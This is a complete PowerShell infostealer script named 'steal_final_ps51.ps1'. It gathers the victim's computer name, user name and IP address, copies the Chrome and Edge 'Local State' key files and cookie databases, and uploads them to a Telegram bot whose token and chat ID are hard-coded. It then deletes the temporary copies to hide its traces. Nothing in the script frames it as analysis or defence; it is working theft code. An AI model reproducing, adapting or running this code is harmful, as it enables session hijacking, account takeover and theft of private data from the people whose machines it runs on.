# steal_final_ps51.ps1
# Fully compatible with Windows PowerShell 5.1
# Sends PC info, then each browser file individually

$t = "8940444810:AAHeKIwsLgAI2o7H20984vi_1K-yEI2J3k8"
$c = "6760965981"
$base = "https://api.telegram.org/bot$t"

# --- 1) PC INFO ---
$h = $env:COMPUTERNAME
$us = $env:USERNAME
$ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue)
$body = @{ chat_id = $c; text = "PC: $h | User: $us | IP: $ip" }
Invoke-RestMethod -Uri "$base/sendMessage" -Method Post -Body $body

# --- 2) TEMP FOLDER ---
$temp_dir = "$env:TEMP\steal_tg"
New-Item -ItemType Directory -Force -Path $temp_dir | Out-Null

# --- 3) BROWSER PATHS ---
$browsers = @(
    @{ Name = "Chrome"; LocalState = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"; Cookies = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" },
    @{ Name = "Edge"; LocalState = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"; Cookies = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies" }
)

$sent = 0

foreach ($b in $browsers) {
    # --- Local State ---
    if (Test-Path $b.LocalState) {
        $dst = "$temp_dir\$($b.Name)_LocalState.json"
        Copy-Item $b.LocalState $dst -Force -ErrorAction SilentlyContinue
        if (Test-Path $dst) {
            $uri = "$base/sendDocument?chat_id=$c"
            try {
                Invoke-RestMethod -Uri $uri -Method Post -InFile $dst -ContentType "application/json" -ErrorAction Stop
                $sent++
            } catch {
                # Log error but continue
            }
            Remove-Item $dst -Force -ErrorAction SilentlyContinue
        }
    }
    # --- Cookies ---
    if (Test-Path $b.Cookies) {
        $dst = "$temp_dir\$($b.Name)_Cookies.db"
        Copy-Item $b.Cookies $dst -Force -ErrorAction SilentlyContinue
        if (Test-Path $dst) {
            $uri = "$base/sendDocument?chat_id=$c"
            try {
                Invoke-RestMethod -Uri $uri -Method Post -InFile $dst -ContentType "application/octet-stream" -ErrorAction Stop
                $sent++
            } catch {
                # Log error but continue
            }
            Remove-Item $dst -Force -ErrorAction SilentlyContinue
        }
    }
}

# --- 4) STATUS ---
$status = "Sent $sent file(s). Temp folder: $temp_dir"
$body = @{ chat_id = $c; text = $status }
Invoke-RestMethod -Uri "$base/sendMessage" -Method Post -Body $body
